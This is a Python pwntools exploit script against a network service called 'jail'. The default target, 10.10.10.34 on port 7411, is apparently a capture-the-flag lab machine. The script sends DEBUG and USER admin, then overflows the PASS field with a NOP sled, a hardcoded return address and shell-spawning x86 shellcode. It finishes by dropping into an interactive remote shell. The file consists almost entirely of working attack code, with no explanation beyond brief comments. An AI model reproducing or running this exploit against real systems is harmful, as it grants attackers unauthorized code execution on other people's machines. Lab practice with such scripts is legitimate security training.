import sys
import optparse
from pwn import *

context(arch = 'i386', os = 'linux')

def exploit(remote):
    line = remote.recv(1024)
    print(line)

    #send DEBUG
    remote.send('DEBUG\n')
    line = remote.recv(1024)
    print(line)

    #send USER
    remote.send('USER admin\n')
    line = remote.recv(1024)
    print(line)

    #BUFFER OVERFLOW - IDEA
    # |--NOPs--|--returnAddress--|--Shellcode--|
    #    28-b          4-b             50-b

    #Address = (0xffffd610 + 0x20)
    returnAddress = struct.pack("<I", 0xffffd630)

    #Shellcode taken from https://www.exploit-db.com/exploits/34060/
    shellcode = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"    

    print("Shellcode Length: " + str(len(shellcode)))
    print("Return Addr: " + returnAddress)
    print("Return Address Length: " + str(len(returnAddress)) + "\n")

    #Override $ebp and make it point to the start of the shellcode (0xffffd610 + 0x20)
    payload = '\x90' * 28 + returnAddress + shellcode

    #send PASS 
    remote.sendline('PASS ' + payload)
    line = remote.recv(1024)
    print(line)
   
    print("Exploit finished!\n")

parser = optparse.OptionParser()
parser.add_option('-t', '--target', dest="target", help="specify the target to connect to", default="10.10.10.34")
parser.add_option('-p', '--port', dest="port", help="specify the port to connect to", default=7411)

options, args = parser.parse_args()

target = options.target
port = int(options.port)

io = remote(target,port)

#Run locally - attaching gdb http://docs.pwntools.com/en/stable/gdb.html
#r = process(['./jail'])
#io = remote('localhost', port)

#Forks - https://sourceware.org/gdb/onlinedocs/gdb/Forks.html
#gdb.attach(io, '''
#set follow-fork-mode child
#set detach-on-fork off
#''')

print("\nTargeting: " + target + " (" + str(port) + ")")

exploit(io)
io.interactive()
io.close()
#r.close()
